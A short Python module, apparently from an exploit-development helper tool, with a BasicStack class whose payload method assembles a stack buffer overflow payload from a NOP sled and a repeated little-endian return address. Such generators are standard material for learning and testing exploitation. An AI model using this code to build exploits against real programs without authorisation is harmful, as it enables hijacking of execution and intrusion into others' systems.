#!/usr/bin/env python
#-*- coding: utf-8 -*-

# FIXME: temporal fix until path correctly configured
import sys, os
sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
from utils.utils import Utils

class BasicStack(object):

    @staticmethod
    def payload(args):
        res = ''
        nops_num = ''
        if 'nops_number' in args:
            # argparse returns a list with one item
            nops_num = args['nops_number'][0]
            if nops_num.isdigit():
                nops_num = int(nops_num)
            else:
                print('Number of NOPS parameter should be a digit.')
                return res
        ret_num = ''
        if 'ret_number' in args:
            # argparse returns a list with one item
            ret_num = args['ret_number'][0]
            if ret_num.isdigit():
                ret_num = int(ret_num)
            else:
                print('Number of return address repetition  parameter should be a digit.')
                return res
        ret_addr = ''
        if 'ret_addr' in args:
            ret_addr = args['ret_addr']
            ret_addr = Utils.addr_to_byte(ret_addr, bo='le')

        res += '\x90' * nops_num + ret_addr * ret_num
        return res

